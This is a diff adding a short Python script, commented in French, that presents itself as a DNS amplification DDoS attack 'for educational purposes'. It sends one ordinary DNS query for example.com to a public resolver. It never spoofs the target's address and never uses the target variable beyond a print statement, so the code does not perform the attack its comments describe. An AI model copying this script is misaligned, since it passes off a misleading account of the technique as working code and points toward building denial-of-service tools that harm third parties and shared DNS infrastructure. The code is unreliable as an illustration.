@@ -1,0 +1,21 @@
+# DDOS - Attaques par amplification (DNS Amplification)
+
+import socket
+
+def dns_amplification(target_ip, dns_server):
+    print(f"Lancement d'une attaque DNS amplification sur {target_ip} via {dns_server}...")
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        dns_query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
+        sock.sendto(dns_query, (dns_server, 53))
+    except Exception as e:
+        print(f"Erreur lors de l'envoi de la requête DNS: {e}")
+    finally:
+        sock.close()
+
+# Paramètres de l'attaque simulée (à des fins éducatives uniquement)
+target_ip = "127.0.0.1"  # Adresse IP de la cible (localhost dans cet exemple)
+dns_server = "8.8.8.8"   # Serveur DNS ouvert (Google DNS dans cet exemple)
+
+# Lancer l'attaque simulée
+dns_amplification(target_ip, dns_server)
